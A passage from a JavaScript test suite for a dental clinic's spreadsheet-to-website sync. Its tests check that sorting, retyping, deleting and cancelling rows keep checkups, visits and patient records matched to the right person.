  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Fatima Saleem');
  server.editCheckup(c.id, { follow_up: 'Interested' });
  env.ticks(1);
  setCell(env, GUL, 2, 'patient', 'Fatima Javed');
  env.tickAfter(20000);
  assert.equal(c.name, 'Fatima Saleem', 'a name being typed over a linked row is held back while the row is busy');
  env.advance(15000);
  setCell(env, GUL, 2, 'contact', '03001110602');
  env.tickAfter(20000);
  assert.equal(c.phone, '03001110601', 'and so is the phone');
  env.advance(61000);
  env.ticks(4);
  assert.equal(c.name, 'Fatima Saleem', 'the first checkup was not renamed');
  assert.equal(c.phone, '03001110601');
  assert.equal(c.details, 'wants braces quote');
  assert.equal(c.follow_up, 'Interested');
  const j = server.state.checkups.find((x) => x.name === 'Fatima Javed');
  assert.ok(j && j.id !== c.id);
  assert.equal(j.phone, '03001110602');
  assert.equal(j.follow_up, 'Not Contacted');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), j.sheet_key);
});

test('RS5-1: the phone typed first, then the name: the first checkup is not changed either', () => {
  const { env, server } = world({ rows: { [GUL]: [ckRow('First Person', '03001110701')] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'First Person');
  server.editCheckup(c.id, { follow_up: 'Interested' });
  env.ticks(1);
  setCell(env, GUL, 2, 'contact', '03001110799');
  env.tickAfter(20000);
  assert.equal(c.phone, '03001110701', 'the phone of a row being typed in is not sent yet');
  env.advance(15000);
  setCell(env, GUL, 2, 'patient', 'Second Person');
  env.tickAfter(5000);
  env.advance(61000);
  env.ticks(4);
  assert.equal(c.name, 'First Person');
  assert.equal(c.phone, '03001110701');
  assert.ok(server.state.checkups.find((x) => x.name === 'Second Person' && x.phone === '03001110799' && x.id !== c.id));
  // a phone corrected on its own is still sent, once the row is quiet
  const r = rowOf(env, GUL, 'First Person');
  setCell(env, GUL, r, 'contact', '03001110702');
  env.advance(61000);
  env.ticks(2);
  assert.equal(c.phone, '03001110702', 'the same person with a corrected phone: the checkup follows');
});

test('RS5-1: a registered checkup row (its Mr# written back) typed over with another name and phone, the Mr# left in: the checkup keeps its patient and the row is refused', () => {
  const { env, server } = world({ rows: { [GUL]: [ckRow('First Person', '03001110701')] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'First Person');
  server.addPatient({ mr: '50030', name: 'First Person', phone: '03001110701' });
  server.editCheckup(c.id, { patient_mr: '50030' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50030');
  setCell(env, GUL, 2, 'patient', 'Second Person');
  env.tickAfter(20000);
  env.advance(15000);
  setCell(env, GUL, 2, 'contact', '03001110799');
  env.tickAfter(5000);
  env.advance(61000);
  env.ticks(4);
  assert.equal(c.name, 'First Person', 'the checkup linked to patient 50030 is not renamed');
  assert.equal(c.phone, '03001110701');
  assert.equal(c.patient_mr, '50030');
  assert.equal(server.state.visits.length, 0, 'no visit');
  assert.match(statusOf(env, GUL, 2), /^✗ Needs attention: the name in this row does not match Mr# 50030 on the website\./);
});

test('RS5-1: two checkups of one family on ONE phone, sorted with only the visible columns, keep their own person; the registered one keeps its patient and notes', () => {
  const { env, server } = world({ rows: { [GUL]: [ckRow('Zainab Family', '03001112222'), ckRow('Amna Family', '03001112222')] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const z = server.state.checkups.find((x) => x.name === 'Zainab Family');
  const a = server.state.checkups.find((x) => x.name === 'Amna Family');
  server.addPatient({ mr: '50031', name: 'Zainab Family', phone: '03001112222' });
  server.editCheckup(z.id, { patient_mr: '50031', follow_up: 'Zainab starts braces' });
  server.editCheckup(a.id, { follow_up: 'Amna calls back' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Zainab'), 'mr'), '50031');
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const nc = colOf(env, GUL, 'patient') - 1;
  const vis = [2, 3].map((r) => sh.row(r).slice(0, kc - 1)).sort((x, y) => String(x[nc]).localeCompare(String(y[nc])));
  [2, 3].forEach((r, i) => putVisible(sh, r, vis[i]));
  assert.equal(sh.text(2, nc + 1), 'Amna Family', "the sort moved Amna onto Zainab's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(5);
  assert.equal(server.state.checkups.length, 2, 'no checkup made, none lost');
  assert.equal(server.state.visits.length, 0, 'the registered checkup did not become a visit');
  assert.equal(z.name, 'Zainab Family');
  assert.equal(z.patient_mr, '50031');
  assert.equal(z.follow_up, 'Zainab starts braces');
  assert.equal(a.name, 'Amna Family');
  assert.equal(a.follow_up, 'Amna calls back');
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Zainab'), 'sync key'), z.sheet_key, "Zainab's row is her own checkup");
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Amna'), 'sync key'), a.sheet_key, "Amna's row is hers");
  assert.equal(cellOf(env, GUL, rowOf(env, GUL, 'Amna'), 'mr'), '', 'no Mr# in the unregistered row');
  for (const r of [2, 3]) assert.equal(statusOf(env, GUL, r), '✓ On website', 'row ' + r);
  assert.equal(server.state.removedLog.length, 0);
  quiet(env, server);
});

test('RS5-2: a website checkup ("Scaling", phone saved as 0300-1117777) cut and pasted with the visible cells only is the same checkup: not deleted, not made twice', () => {
  const { env, server } = synced();
  const c = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Amna Scaling', phone: '0300-1117777', checkup_for: 'Scaling', follow_up: 'Not Contacted' });
  const d = server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Hina Checked', phone: '0300 1117778', checkup_for: 'Checkup', follow_up: 'Interested' });
  env.ticks(3);
  const sh = env.tab(GUL);
  const kc = colOf(env, GUL, 'website');
  const before = server.state.checkups.length;
  for (const [who, to] of [['Amna Scaling', 12], ['Hina Checked', 13]]) {
    const r = rowOf(env, GUL, who);
    assert.ok(r, who + ' was added from the website');
    const cells = []; for (let col = 1; col < kc; col++) cells.push(sh._get(r, col));
    for (let col = 1; col < kc; col++) sh._set(r, col, null);
    cells.forEach((cell, i) => { if (cell) sh._set(to, i + 1, cell); });
    env.ctx.aajOnEdit({ range: sh.getRange(to, 1, 1, kc - 1), source: env.book });
    env.touch();
    env.advance(61000);
    env.ticks(4);
  }
  assert.equal(server.state.checkups.length, before, 'no checkup deleted, none made');
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed as a deleted row');
  assert.equal(server.checkupById(c.id).sheet_key, sh.text(12, colOf(env, GUL, 'sync key')), 'Amna Scaling is the row it was moved to');
  assert.equal(server.checkupById(d.id).sheet_key, sh.text(13, colOf(env, GUL, 'sync key')), 'and so is Hina');
  assert.equal(server.checkupById(d.id).follow_up, 'Interested');
  assert.equal(statusOf(env, GUL, 12), '✓ On website');
  assert.equal(statusOf(env, GUL, 13), '✓ On website');
  assert.equal(server.state.checkups.filter((x) => x.name === 'Hina Checked').length, 1);
  assert.equal([...Array(sh.used().rows).keys()].filter((i) => sh.text(i + 1, colOf(env, GUL, 'patient')) === 'Hina Checked').length, 1, 'Hina is in the sheet once');
  quiet(env, server);
});

test('RS5-2: the hidden helper columns deleted: a website checkup ("Braces consultation") and a checkup without a phone keep their own checkups', () => {
  const rows = [...SYNCED_ROWS, ckRow('No Phone Ck', '')];
  const { env, server } = world({ patients: [...BASE_PATIENTS, ...SYNC_PATIENTS], rows: { [GUL]: rows } });
  settle(env, 3);
  server.addCheckup({ branch: 'GUL', date: TODAY, name: 'Braces Consult', phone: '0300-1117779', checkup_for: 'Braces consultation' });
  env.ticks(3);
  const ids = server.state.checkups.map((x) => x.id).sort();
  assert.equal(ids.length, 2);
  const visits = server.state.visits.map((v) => v.id).sort();
  const sh = env.tab(GUL);
  const keyC = colOf(env, GUL, 'sync key'), baseC = colOf(env, GUL, 'sync base');
  for (let r = 1; r <= 12; r++) { sh._set(r, keyC, null); sh._set(r, baseC, null); }
  env.touch();
  env.ticks(4);
  assert.deepEqual(server.state.checkups.map((x) => x.id).sort(), ids, 'the same two checkups: none deleted, none made again');
  assert.deepEqual(server.state.visits.map((v) => v.id).sort(), visits, 'the same visits');
  assert.equal(server.state.removedLog.length, 0);
  const keys = keysOf(env, GUL);
  for (const x of server.state.checkups) assert.ok(keys.includes(x.sheet_key), x.name + ' carries the new key of its row');
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ loop 6 (2026-10-10): sheet-behaviour M1
/** sorts rows `rs` of the tab by Patient Name with only the visible columns (the hidden helper columns stay where they were) */
function sortVisibleByName(env, tab, rs) {
  const sh = env.tab(tab);
  const kc = colOf(env, tab, 'website');
  const nc = colOf(env, tab, 'patient') - 1;
  const vis = rs.map((r) => sh.row(r).slice(0, kc - 1)).sort((x, y) => String(x[nc]).localeCompare(String(y[nc])));
  rs.forEach((r, i) => putVisible(sh, r, vis[i]));
  return nc;
}

test('M1 (loop 6): two checkups of one family on ONE phone whose first names FIT (Syed Ali Raza / Ali Hamza), the first registered, sorted with only the visible columns: each keeps its own checkup, notes and patient link', () => {
  const P = '03001114444';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Syed Ali Raza', P), ckRow('Ali Hamza', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const rz = server.state.checkups.find((x) => x.name === 'Syed Ali Raza');
  const hm = server.state.checkups.find((x) => x.name === 'Ali Hamza');
  server.addPatient({ mr: '50040', name: 'Syed Ali Raza', phone: P });
  server.editCheckup(rz.id, { patient_mr: '50040', follow_up: 'Raza starts braces' });
  server.editCheckup(hm.id, { follow_up: 'Hamza calls back' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, exactRow(env, GUL, 'Syed Ali Raza'), 'mr'), '50040', 'the website wrote the Mr# into the registered row');
  const nc = sortVisibleByName(env, GUL, [2, 3]);
  assert.equal(env.tab(GUL).text(2, nc + 1), 'Ali Hamza', "the sort moved Ali Hamza onto Ali Raza's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(5);
  assert.equal(server.state.checkups.length, 2, 'no checkup made, none lost');
  assert.equal(server.state.visits.length, 0, 'the registered checkup did not become a visit');
  assert.equal(rz.name, 'Syed Ali Raza', 'Ali Raza\'s checkup was not renamed to his brother');
  assert.equal(rz.patient_mr, '50040');
  assert.equal(rz.follow_up, 'Raza starts braces');
  assert.equal(hm.name, 'Ali Hamza');
  assert.equal(hm.patient_mr, null);
  assert.equal(hm.follow_up, 'Hamza calls back');
  const rRow = exactRow(env, GUL, 'Syed Ali Raza'), hRow = exactRow(env, GUL, 'Ali Hamza');
  assert.equal(cellOf(env, GUL, rRow, 'sync key'), rz.sheet_key, "Ali Raza's row is his own checkup");
  assert.equal(cellOf(env, GUL, hRow, 'sync key'), hm.sheet_key, "Ali Hamza's row is his");
  assert.equal(cellOf(env, GUL, rRow, 'mr'), '50040');
  assert.equal(cellOf(env, GUL, hRow, 'mr'), '', 'no Mr# was written into the brother\'s row');
  for (const r of [2, 3]) assert.equal(statusOf(env, GUL, r), '✓ On website', 'row ' + r);
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed');
  assert.equal(env.tab(GUL).used().rows, 3, 'no row was added back');
  quiet(env, server);
});

test('M1 (loop 6): Hassan / Hussain on one phone (first names two letters apart), neither registered, sorted with only the visible columns: names, notes and follow-up are not swapped', () => {
  const P = '03001115555';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Hussain Ahmed', P, 'Checkup', 'wants braces quote'), ckRow('Hassan Ahmed', P, 'Checkup', 'pain lower right')] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const hu = server.state.checkups.find((x) => x.name === 'Hussain Ahmed');
  const ha = server.state.checkups.find((x) => x.name === 'Hassan Ahmed');
  server.editCheckup(hu.id, { follow_up: 'Interested' });
  env.ticks(1);
  const nc = sortVisibleByName(env, GUL, [2, 3]);
  assert.equal(env.tab(GUL).text(2, nc + 1), 'Hassan Ahmed', "the sort moved Hassan onto Hussain's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(5);
  assert.equal(server.state.checkups.length, 2, 'no checkup made, none lost');
  assert.equal(hu.name, 'Hussain Ahmed');
  assert.equal(hu.details, 'wants braces quote');
  assert.equal(hu.follow_up, 'Interested', 'the follow-up stays with Hussain');
  assert.equal(ha.name, 'Hassan Ahmed');
  assert.equal(ha.details, 'pain lower right');
  assert.equal(ha.follow_up, 'Not Contacted');
  assert.equal(cellOf(env, GUL, exactRow(env, GUL, 'Hussain Ahmed'), 'sync key'), hu.sheet_key, "Hussain's row is his own checkup");
  assert.equal(cellOf(env, GUL, exactRow(env, GUL, 'Hassan Ahmed'), 'sync key'), ha.sheet_key, "Hassan's row is his");
  for (const r of [2, 3]) assert.equal(statusOf(env, GUL, r), '✓ On website', 'row ' + r);
  assert.equal(server.state.removedLog.length, 0);
  quiet(env, server);
});

test('M1 (loop 6): a registered checkup row (its Mr# written back) typed over by a brother on the same phone, the Mr# cleared: the registered checkup keeps its name and patient; the brother gets his own checkup', () => {
  const P = '03001117777';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Syed Ali Raza', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const rz = server.state.checkups.find((x) => x.name === 'Syed Ali Raza');
  server.addPatient({ mr: '50041', name: 'Syed Ali Raza', phone: P });
  server.editCheckup(rz.id, { patient_mr: '50041', follow_up: 'Raza starts braces' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50041');
  setCell(env, GUL, 2, 'mr', '');
  setCell(env, GUL, 2, 'patient', 'Ali Hamza');
  env.advance(61000);
  env.ticks(4);
  assert.equal(rz.name, 'Syed Ali Raza', 'the registered checkup was not renamed to the brother');
  assert.equal(rz.patient_mr, '50041');
  assert.equal(rz.follow_up, 'Raza starts braces');
  const hm = server.state.checkups.find((x) => x.name === 'Ali Hamza');
  assert.ok(hm && hm.id !== rz.id, 'the brother has a checkup of his own');
  assert.equal(hm.patient_mr, null);
  assert.equal(cellOf(env, GUL, 2, 'sync key'), hm.sheet_key);
  assert.equal(server.state.visits.length, 0);
  assert.ok(exactRow(env, GUL, 'Syed Ali Raza'), 'a checkup that is already a patient is kept by the website and its row comes back');
});

test('loop 6 (minor): the same patient twice on the website\'s list: both rows say so; once staff set one of them to Cancelled, the other row goes back to a tick (it never asks to cancel the real visit too)', () => {
  const { env, server } = world({ rows: { [GUL]: [] }, patients: [{ mr: '9801', name: 'Twice Patient', phone: '03001119801' }, { mr: '9802', name: 'Other Patient', phone: '03001119802' }] });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9801', status: 'waiting', treatment: 'Scaling' });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9801', status: 'waiting', treatment: 'Scaling' });
  settle(env, 3);
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '9802', status: 'waiting', treatment: 'Filling' });     // a new list arrives
  env.ticks(3);
  const DUP = "⚠ Same patient twice on today's list. Set one of them to Cancelled.";
  assert.equal(statusOf(env, GUL, 2), DUP);
  assert.equal(statusOf(env, GUL, 3), DUP);
  setCell(env, GUL, 3, 'waiting', 'Cancelled');
  settle(env, 3);
  assert.equal(server.state.visits.filter((v) => v.mr === '9801' && v.status === 'cancelled').length, 1);
  assert.equal(statusOf(env, GUL, 2), '✓ On website', 'the visit left is not flagged any more');
  assert.notEqual(statusOf(env, GUL, 3), DUP);
});

test('loop 6 (minor): a checkup registered as a patient and a website visit of that patient the same day are not "Same patient twice"', () => {
  const P = '03001118888';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Reg Twice', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Reg Twice');
  server.addPatient({ mr: '50042', name: 'Reg Twice', phone: P });
  server.editCheckup(c.id, { patient_mr: '50042' });
  server.addVisit({ branch: 'GUL', date: TODAY, mr: '50042', status: 'waiting', treatment: 'Scaling' });
  env.ticks(3);
  const rows = [2, 3].filter((r) => cellOf(env, GUL, r, 'patient') === 'Reg Twice');
  assert.equal(rows.length, 2, 'the checkup row and the visit added from the website');
  for (const r of rows) assert.doesNotMatch(statusOf(env, GUL, r), /twice/, 'row ' + r + ': ' + statusOf(env, GUL, r));
});

test('M1 (loop 6): with a brother on the same phone, a slip in the surname is still corrected on the same checkup (nobody else has the old name)', () => {
  const P = '03001116666';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Ali Raza', P), ckRow('Ali Hamza', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const rz = server.state.checkups.find((x) => x.name === 'Ali Raza');
  server.editCheckup(rz.id, { follow_up: 'Called once' });
  env.ticks(1);
  const key = cellOf(env, GUL, 2, 'sync key');
  setCell(env, GUL, 2, 'patient', 'Ali Rasa');
  env.advance(61000);
  env.ticks(3);
  assert.equal(cellOf(env, GUL, 2, 'sync key'), key, 'the same row key');
  assert.equal(rz.name, 'Ali Rasa', 'the checkup follows the corrected name');
  assert.equal(rz.follow_up, 'Called once');
  assert.equal(server.state.checkups.length, 2);
  quiet(env, server);
});

// ------------------------------------------------------------------------------------------------ loop 7 (2026-10-10): sheet-behaviour M1-M3, abuse-privacy M1
/** sorts rows `rs` of the tab by the column `label` with only the visible columns (the hidden helper columns stay where they were) */
function sortVisibleBy(env, tab, rs, label) {
  const sh = env.tab(tab);
  const kc = colOf(env, tab, 'website');
  const c = colOf(env, tab, label) - 1;
  const vis = rs.map((r) => sh.row(r).slice(0, kc - 1)).sort((x, y) => String(x[c]).localeCompare(String(y[c])));
  rs.forEach((r, i) => putVisible(sh, r, vis[i]));
}

test('M1 (loop 7): a checkup registered as a patient and that patient\'s visit of the same day (same Mr#, name and phone), sorted by Treatment with only the visible columns: each row takes its own key; the visit keeps its treatment, Month and status, the checkup its own', () => {
  const P = '03001117771';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Hira Naz', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Hira Naz');
  server.addPatient({ mr: '50050', name: 'Hira Naz', phone: P });
  server.editCheckup(c.id, { patient_mr: '50050', day_status: 'completed' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '50050', status: 'waiting', treatment: 'Braces bonding', braces_month: 1 });
  env.ticks(3);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50050', 'the website wrote the Mr# into the checkup row');
  assert.equal(cellOf(env, GUL, 3, 'treatment'), 'Braces bonding', 'the visit was added below the checkup');
  const vNow = () => JSON.stringify([v.treatment_label, v.braces_month, v.status]);
  const cNow = () => JSON.stringify([c.checkup_for, c.day_status, c.details, c.patient_mr]);
  const before = { v: vNow(), c: cNow() };
  sortVisibleBy(env, GUL, [2, 3], 'treatment');
  assert.equal(cellOf(env, GUL, 2, 'treatment'), 'Braces bonding', "the sort moved the visit onto the checkup's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(vNow(), before.v, 'the visit was not turned into the checkup');
  assert.equal(cNow(), before.c, 'the checkup was not turned into the visit');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), v.sheet_key, 'the bonding row now carries the visit\'s key');
  assert.equal(cellOf(env, GUL, 3, 'sync key'), c.sheet_key, 'the checkup row carries the checkup\'s key');
  for (const r of [2, 3]) assert.equal(statusOf(env, GUL, r), '✓ On website', 'row ' + r + ': ' + statusOf(env, GUL, r));
  assert.equal(server.state.removedLog.length, 0, 'nothing was removed');
  assert.equal(server.state.visits.length, 1);
  assert.equal(server.state.checkups.length, 1);
  quiet(env, server);
});

test('M1 (loop 7): two walk-ins with the SAME full name on two phones, sorted by Treatment with only the visible columns: phone, treatment, details and follow-up notes stay with their own person', () => {
  const rows = [ckRow('Ayesha', '03001119992', 'Checkup', 'pain upper right'), ckRow('Ayesha', '03001119991', 'Braces checkup', 'wants a quote')];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  const a2 = server.state.checkups.find((x) => x.phone === '03001119992');
  const a1 = server.state.checkups.find((x) => x.phone === '03001119991');
  server.editCheckup(a1.id, { follow_up: 'call about braces quote' });
  env.ticks(1);
  sortVisibleBy(env, GUL, [2, 3], 'treatment');
  assert.equal(cellOf(env, GUL, 2, 'contact'), '03001119991', "the sort moved the second Ayesha onto the first one's hidden key");
  env.touch();
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.state.checkups.length, 2, 'no checkup made, none lost');
  assert.deepEqual([a1.phone, a1.checkup_for, a1.details, a1.follow_up], ['03001119991', 'Braces checkup', 'wants a quote', 'call about braces quote'], 'the follow-up stays with the Ayesha it was written for');
  assert.deepEqual([a2.phone, a2.checkup_for, a2.details, a2.follow_up], ['03001119992', 'Checkup', 'pain upper right', 'Not Contacted']);
  assert.equal(cellOf(env, GUL, 2, 'sync key'), a1.sheet_key);
  assert.equal(cellOf(env, GUL, 3, 'sync key'), a2.sheet_key);
  assert.equal(server.state.removedLog.length, 0);
  quiet(env, server);
});

test('M1 (loop 7): the same two Ayeshas sorted, and one row edited before the next minute (so the rows are not just swapped): each row is still not the other person; both find their own checkup by name and phone', () => {
  const rows = [ckRow('Ayesha', '03001119994', 'Checkup', 'pain upper right'), ckRow('Ayesha', '03001119993', 'Braces checkup', 'wants a quote')];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  const a2 = server.state.checkups.find((x) => x.phone === '03001119994');
  const a1 = server.state.checkups.find((x) => x.phone === '03001119993');
  server.editCheckup(a1.id, { follow_up: 'call about braces quote' });
  env.ticks(1);
  sortVisibleBy(env, GUL, [2, 3], 'treatment');
  setCell(env, GUL, 2, 'waiting', 'Treatment');
  env.touch();
  env.advance(61000);
  env.ticks(5);
  assert.equal(server.state.checkups.length, 2, 'no checkup made, none lost');
  assert.deepEqual([a1.phone, a1.details, a1.follow_up], ['03001119993', 'wants a quote', 'call about braces quote'], 'the follow-up stays with its own Ayesha');
  assert.deepEqual([a2.phone, a2.details, a2.follow_up], ['03001119994', 'pain upper right', 'Not Contacted']);
  assert.equal(cellOf(env, GUL, 2, 'sync key'), a1.sheet_key, "row 2 now holds the first Ayesha's phone: it is her checkup");
  assert.equal(cellOf(env, GUL, 3, 'sync key'), a2.sheet_key);
  assert.equal(server.state.removedLog.length, 0);
});

test('M2 (loop 7): a Month typed into a checkup row (an existing braces patient whose card was forgotten): the row needs the Mr#, the person is not kept as a checkup nor put on the nightly list; typing the Mr# makes the visit', () => {
  const P = '03001116001';
  const { env, server } = world({ rows: { [GUL]: [ckRow('Brace Forgot', P)] }, patients: [...BASE_PATIENTS, { mr: '9760', name: 'Brace Forgot', phone: P }] });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'Brace Forgot');
  assert.ok(c, 'first a checkup');
  setCell(env, GUL, 2, 'months', '6');
  setCell(env, GUL, 2, 'treatment', 'Wire change');
  env.advance(61000);
  env.ticks(3);
  assert.match(statusOf(env, GUL, 2), /^✗ Needs attention: add the Mr#/);
  assert.notEqual(c.checkup_for, 'Wire change', 'the checkup was not turned into a wire change');
  assert.equal(server.state.checkups.length, 0, 'the plain checkup is taken off the checkup list: the person is a braces patient');
  assert.equal(server.state.visits.length, 0);
  setCell(env, GUL, 2, 'mr', '9760');
  env.advance(61000);
  env.ticks(3);
  const v = server.state.visits.find((x) => x.mr === '9760');
  assert.ok(v, 'with the Mr# the row is the patient\'s visit');
  assert.deepEqual([v.braces_month, v.treatment_label], [6, 'Wire change']);
  assert.equal(statusOf(env, GUL, 2), '✓ On website');
  env.at(TODAY, '23:58'); env.ticks(1);
  env.at(NEXT, '00:05'); env.ticks(1);
  const ck = ckSheet(env);
  assert.ok(!ck || !ck.values().some((r) => r.includes('Brace Forgot')), 'not on the nightly checkup list');
});

test('M2 (loop 7): a checkup registered as a patient whose row then gets Month 1 and "Braces bonding": the visit is made for that patient; the checkup keeps its own record and comes back as its own row', () => {
  const P = '03001116002';
  const { env, server } = world({ rows: { [GUL]: [ckRow('New Smile', P)] }, patients: BASE_PATIENTS });
  settle(env, 3);
  const c = server.state.checkups.find((x) => x.name === 'New Smile');
  server.addPatient({ mr: '50051', name: 'New Smile', phone: P });
  server.editCheckup(c.id, { patient_mr: '50051' });
  env.ticks(2);
  assert.equal(cellOf(env, GUL, 2, 'mr'), '50051');
  setCell(env, GUL, 2, 'months', '1');
  setCell(env, GUL, 2, 'treatment', 'Braces bonding');
  env.advance(61000);
  env.ticks(4);
  const v = server.state.visits.find((x) => x.mr === '50051');
  assert.ok(v, 'the bonding is a visit of patient 50051');
  assert.deepEqual([v.braces_month, v.treatment_label], [1, 'Braces bonding']);
  assert.equal(c.checkup_for, 'Checkup', 'the checkup was not turned into the bonding');
  assert.equal(c.patient_mr, '50051');
  assert.equal(cellOf(env, GUL, 2, 'sync key'), v.sheet_key, 'the typed row is the visit');
  assert.ok([3, 4].some((r) => cellOf(env, GUL, r, 'sync key') === c.sheet_key), 'the registered checkup is kept by the website and comes back as its own row');
  assert.equal(server.state.checkups.length, 1);
});

test('M2 (loop 7): the nightly checkup list never takes a row with a Month, even one the website filed as a checkup; such a row is named for the log', () => {
  const env0 = createEnv();
  const s = { cfg: { tab: GUL, branch: 'GUL' }, cols: env0.call('aajDetectColumns', fixture.headers[GUL]) };
  const row = (mr, name, month, treatment, extra = {}) => ({ key: '', fp: '', cells: [mr, name, month, treatment, '', 'Waiting', '', '', '', '', '', '03001110500', ''], visit: '', checkup: false, ...extra });
  const skipped = [];
  const lines = env0.call('aajCheckupLines', s, [
    row('', 'Plain Checkup', '', 'Checkup', { checkup: true, visit: 'c1' }),
    row('', 'Brace Forgot', '6', 'Wire change', { checkup: true, visit: 'c2' }),
    row('50051', 'New Smile', '1', 'Braces bonding', { checkup: true, visit: 'c3' }),
    row('', 'Never Seen Month', '04 Photo', 'Checkup'),
  ], TODAY, skipped);
  assert.deepEqual(lines.map((l) => l.name), ['Plain Checkup']);
  assert.deepEqual(skipped, ['Brace Forgot', 'New Smile']);
});

test('abuse-privacy M1 (loop 7): a retired Mr# typed with the same first name and another surname is a new Healthwire patient, never "use 50905"', () => {
  const rows = [['10905', 'Ali Raza', '', 'RCT', '', 'Waiting', '', '', '', '', '', '', '']];
  const patients = [{ mr: '50905', name: 'Ali Khanzada', notes: 'Mr# was 10905 until 09 Oct 2026 (the website now numbers from 50000)' }];
  const { env, server } = world({ rows: { [GUL]: rows }, patients });
  settle(env, 3);
  assert.equal(statusOf(env, GUL, 2), '⚠ New patient added with Healthwire Mr# 10905. Check the name and phone on the website.');
  assert.deepEqual(server.state.visits.map((v) => v.mr), ['10905'], "the visit is on the new patient's own file, not on Ali Khanzada's");
});

test('M3 (loop 7): a Healthwire Mr# typed with a slip, then corrected in the row: the right patient gets the visit, the file made from the slip is removed, and the log says so', () => {
  const rows = [['9888', 'Slip Person', '', 'Consultation', '', 'Waiting', '', '', '', '', '', '03001116003', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  assert.ok(server.patientByMr('9888'), 'the slip made a patient file');
  setCell(env, GUL, 2, 'mr', '9878');
  env.advance(61000);
  env.ticks(4);
  assert.equal(server.patientByMr('9888'), undefined, 'the file made from the slip is gone');
  assert.ok(server.patientByMr('9878'));
  assert.deepEqual(server.state.visits.map((v) => v.mr), ['9878']);
  assert.match(env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n'), /So is the patient file made from this row \(Mr# 9888\)/);
});

// ------------------------------------------------------------------------------------------------ loop 8 (2026-10-10): released rows, deleted website rows, No show, adoption, names
const logText = (env) => env.tab('Aaj Sync log').values().map((r) => r.join(' ')).join('\n');

test('RS5-D4: a website visit cancelled on the website, its row deleted, then set back to Waiting there: the sync never deletes it, and its row comes back', () => {
  const { env, server } = synced();
  server.addPatient({ mr: '9796', name: 'Cancel Later', phone: '03001110096' });
  const v = server.addVisit({ branch: 'GUL', date: TODAY, mr: '9796', status: 'waiting' });
  env.ticks(2);
  const r = rowOf(env, GUL, 'Cancel Later');
  assert.ok(r, 'added from the website');
  server.editVisit(v.id, { status: 'cancelled' });
  env.ticks(1);
  env.deleteRows(GUL, r);
  env.ticks(2);
  assert.equal(rowOf(env, GUL, 'Cancel Later'), null, 'gone from the sheet');
  assert.ok(server.state.released.has(v.id), 'released: its row left the sheet while it was Cancelled');
  server.editVisit(v.id, { status: 'waiting' });       // the patient came after all
  env.ticks(3);
  assert.equal(server.visitById(v.id), v, 'not deleted as a deleted row');
  assert.equal(v.status, 'waiting');
  const back = rowOf(env, GUL, 'Cancel Later');
  assert.ok(back, 'its row is back');
  assert.equal(statusOf(env, GUL, back), '✓ Added from the website');
  assert.equal(cellOf(env, GUL, back, 'sync key'), v.sheet_key);
  assert.ok(!server.state.released.has(v.id), 'on the sheet again: an ordinary row');
  assert.equal(server.state.removedLog.length, 0);
  quiet(env, server);
});

test('RS5-D4: a visit made in the sheet (S- key) and a checkup, cancelled on the website, their rows deleted, then set to Waiting there: neither is deleted, both rows come back', () => {
  const rows = [['9701', 'Sample Person One', '', 'Filling', '', 'Waiting', '', '', '', '', '', '03001110001', ''], ckRow('Rel Check', '03001110777'),
    ['146', 'Sample Person Two', '', 'Scaling', '', 'Waiting', '', '', '', '', '', '03001110002', '']];
  const { env, server } = world({ rows: { [GUL]: rows }, patients: BASE_PATIENTS });
  settle(env, 3);
  const v = server.state.visits.find((x) => x.mr === '9701'), c = server.state.checkups.find((x) => x.name === 'Rel Check');
  assert.match(v.sheet_key, /^S-/);
  server.editVisit(v.id, { status: 'cancelled' });
  server.editCheckup(c.id, { day_status: 'cancelled' });
  env.ticks(1);
  env.deleteRows(GUL, rowOf(env, GUL, 'Rel Check'));
